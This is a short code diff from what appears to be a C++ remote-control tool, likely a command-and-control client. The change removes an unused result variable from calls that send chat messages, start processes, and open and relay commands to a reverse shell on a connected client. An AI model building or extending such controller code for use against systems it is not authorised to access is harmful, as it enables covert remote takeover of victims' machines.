@@ -63,7 +63,7 @@ void Entrypoint::SendChatMessage() const
 {
 	ValidateSelection();
 
-	int result = _manager->Send(
+	_manager->Send(
 		*_client,
 		MessageType::Chat,
 		_argsSpan);
@@ -73,7 +73,7 @@ void Entrypoint::SendCreateProcess() const
 {
 	ValidateSelection();
 
-	int result = _manager->Send(
+	_manager->Send(
 		*_client,
 		MessageType::CreateProcessS,
 		_argsSpan);
@@ -83,7 +83,7 @@ void Entrypoint::SendReverseShell()
 {
 	ValidateSelection();
 
-	int result = _manager->Send(
+	_manager->Send(
 		*_client,
 		MessageType::StartReverseShell,
 		_argsSpan);
@@ -94,14 +94,14 @@ void Entrypoint::SendReverseShell()
 
 		if (_command == "exit")
 		{
-			result = _manager->Send(
+			_manager->Send(
 				*_client,
 				MessageType::StopReverseShell,
 				_commandSpan);
 			break;
 		}
 
-		result = _manager->Send(
+		_manager->Send(
 			*_client,
 			MessageType::ReverseShellMessage,
 			_commandSpan);
